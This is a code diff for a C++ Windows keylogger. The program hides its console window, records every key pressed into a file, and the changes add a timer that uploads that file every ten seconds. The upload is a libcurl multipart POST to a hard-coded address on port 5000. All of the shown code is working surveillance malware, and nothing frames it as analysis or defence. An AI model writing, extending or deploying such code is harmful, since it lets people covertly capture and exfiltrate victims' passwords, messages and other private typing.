@@ -1,10 +1,11 @@
 #include <iostream>
-#include <windows.h>
 #include <string>
 #include <fstream>
 #include <map>
 #include <vector>
 #include <curl/curl.h>
+#include <Windows.h>
+#include <windows.h>
 
 
 namespace keys{
@@ -120,72 +121,73 @@ bool isKeyPressed(int key){
 }
 
 
-
-void sendPost(std::string post_data){
+void sendPost(const std::string& filePath) {
     CURL *curl;
     CURLcode res;
+    curl_mime *mime;
+    curl_mimepart *part;
 
-    /* In windows, this inits the winsock stuff */
     curl_global_init(CURL_GLOBAL_ALL);
-
-    /* get a curl handle */
     curl = curl_easy_init();
-    if(curl) {
-        /* First set the URL that is about to receive our POST. This URL can
-           just as well be an https:// URL if that is what should receive the
-           data. */
-        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.118:5000/receive");
-        /* Now specify the POST data */
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");
+    if (curl) {
+        mime = curl_mime_init(curl);
 
-        /* Perform the request, res gets the return code */
+        // Add the file part
+        part = curl_mime_addpart(mime);
+        curl_mime_name(part, "file");  // Name of the form field
+        curl_mime_filedata(part, filePath.c_str());  // File to upload
+
+        // Set up the CURL handle with the URL and the MIME post data
+        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.72:5000/txt");
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+
+        // Perform the request and handle errors
         res = curl_easy_perform(curl);
-        /* Check for errors */
-        if(res != CURLE_OK)
-            fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                    curl_easy_strerror(res));
+        if (res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        }
 
-        /* always cleanup */
+        // Clean up
+        curl_mime_free(mime);
         curl_easy_cleanup(curl);
     }
     curl_global_cleanup();
 }
 
 
-int main(){
+int main() {
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
     std::vector<std::string> buffer;
     std::map<int, bool> key_status;
-
     bool exit = false;
+    DWORD lastTime = GetTickCount();
 
-    while(!exit){
-        for (int i = 0; i < 256; i++){
-
-            if(isKeyPressed(i)){
+    while (!exit) {
+        for (int i = 0; i < 256; i++) {
+            if (isKeyPressed(i)) {
                 auto it = keys::key_codes.find(i);
-
-                if(it != keys::key_codes.end() && !key_status[i]){
-
+                if (it != keys::key_codes.end() && !key_status[i]) {
                     std::cout << it->second << "\n";
-
-                    if(it->second == "Escape"){
+                    if (it->second == "Escape") {
                         save_data(buffer, "data.txt");
                         exit = true;
                     }
-
-
                     buffer.push_back(it->second);
                     key_status[i] = true;
-                }
-
-                else{
+                } else {
                     key_status[i] = false;
                 }
             }
         }
+
+        if (GetTickCount() - lastTime >= 10000) { // 10 seconds
+            lastTime = GetTickCount();
+            save_data(buffer, "data.txt"); // Save any remaining data before sending
+            sendPost("data.txt");
+        }
     }
-    sendPost("");
     return 0;
 }
+
+
